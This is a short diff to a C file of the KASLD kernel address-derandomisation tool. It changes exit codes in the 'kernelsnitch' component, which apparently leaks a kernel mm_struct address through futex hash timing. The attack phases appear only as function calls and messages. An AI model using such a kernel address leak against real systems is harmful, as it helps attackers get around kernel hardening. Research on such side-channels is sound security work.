@@ -39,6 +39,7 @@
 
 #define _GNU_SOURCE
 #include "include/kasld.h"
+#include "include/kasld_internal.h"
 #include <errno.h>
 #include <limits.h>
 #include <linux/futex.h>
@@ -704,7 +705,7 @@ int main(void) {
   if (!getenv("KASLD_EXPERIMENTAL")) {
     fprintf(stderr, "[-] kernelsnitch: experimental component; "
                     "set KASLD_EXPERIMENTAL=1 to enable\n");
-    return 1;
+    return KASLD_EXIT_UNAVAILABLE;
   }
 
   printf("[.] trying KernelSnitch (futex hash timing) ...\n");
@@ -719,7 +720,7 @@ int main(void) {
   if (prctl(PR_FUTEX_HASH, PR_FUTEX_HASH_GET_SLOTS, 0, 0, 0) >= 0) {
     fprintf(stderr, "[-] kernelsnitch: CONFIG_FUTEX_PRIVATE_HASH is enabled; "
                     "attack not possible\n");
-    return 1;
+    return KASLD_EXIT_UNAVAILABLE;
   }
 
   /* Determine futex hash table size. */
@@ -739,7 +740,7 @@ int main(void) {
 
   /* Phase 1: Pile-up. */
   if (create_pileup() < 0)
-    return 1;
+    return 0;
 
   /* Phase 2: Find collision addresses. */
   unsigned long collisions[MAX_COLLISIONS];
@@ -748,7 +749,7 @@ int main(void) {
     fprintf(stderr, "[-] kernelsnitch: insufficient collisions; "
                     "timing signal too noisy?\n");
     cleanup_pileup();
-    return 1;
+    return 0;
   }
 
   /* Unpin CPU for the multi-threaded brute-force. */
@@ -802,7 +803,7 @@ int main(void) {
   if (!result) {
     fprintf(stderr, "[-] kernelsnitch: brute-force failed to find "
                     "mm_struct address\n");
-    return 1;
+    return 0;
   }
 
   printf("leaked mm_struct address: %lx\n", result);
